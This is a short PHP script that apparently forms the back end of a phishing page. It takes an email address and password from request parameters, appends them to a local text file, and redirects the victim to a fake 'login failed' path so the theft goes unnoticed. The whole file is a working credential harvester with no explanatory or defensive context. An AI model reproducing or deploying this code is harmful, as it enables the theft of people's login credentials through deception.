<?php
 $txt= "test.txt";
 if (isset($_GET['Email']) && isset($_GET['Password'])) {
$fh = fopen($txt, 'a'); 
    $txt=' Email: '.$_GET['Email'].' Pass: '.$_GET['Password'];
   fwrite($fh,$txt); // Write information to the file
   fclose($fh); // Close the file
   
   header ("Location: /ssl/instant/loginfailed");
 
 }
?>